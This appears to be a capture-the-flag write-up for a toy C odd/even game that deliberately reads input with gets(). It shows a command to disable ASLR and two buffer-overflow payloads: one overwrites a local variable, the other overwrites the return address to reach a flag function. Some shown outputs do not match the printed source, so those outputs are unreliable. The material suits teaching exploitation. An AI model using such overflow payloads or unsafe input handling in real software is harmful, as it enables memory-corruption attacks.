# Holjak

Turn off ASLR

```python
sudo sysctl -w kernel.randomize_va_space=0
```

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void flag(void)
{
    puts("Well done, you have the flag!");
}

int main(int argc, char **argv)
{
    char input[20];
    printf("Hello this is holjak game\n");
    printf("Please choose between odd and even.(Type '1' or '2')\n");
    printf("1. Odd\n2. Even\n");
    srand(time(NULL));
    int answer = rand() % 2;
    gets(input);
    int guess = atoi(input) % 2;
    if (answer == 3)
    {
        flag();
        exit(1);
    }
    printf("G: %d, A: %d\n", guess, answer);
    if (guess == answer)
        printf("You are correct\n");
    else
        printf("You are wrong, too bad\n");
    exit(0);
}
```

This is a simple “holjak”(odd or even in Korean) game. The program chooses a random odd or evne number. The player has to guess if the number is odd or even.  The ‘answer’ variable is always 0 or 1, as it is a modulus of 2. If the player can exploit the game and tamper the answer so that it becomes 3, an impossible answer, they get the flag.

## Exploit

Simple bof.

```c
$ (python3 -c 'print("A" * 28 + "\x03")') | ./holjak
Hello this is holjak game
Please choose between odd and even.(Type '1' or '2')
1. Odd
2. Even
rand: 3
Well done, you have the flag!
```

## Exploit(modified)

```c
gdb-peda$ p flag
$2 = {void (void)} 0x555555555249 <flag>
```

Find the address of the flag and overwrite the return address.

```bash
teddy@yo-laptop:~/swSec/gitCTF/holjak$ (python3 -c 'print( "A" * 24 + "\x49\x52\x55\x55\x55\x55\x00\x00")') | ./holjak
Hello this is holjak game.

Please choose between odd and even.(Type '1' or '2')

1. Odd
2. Even
Your guess:
The answer is even!

You are wrong, too bad
Well done, you have the flag!
```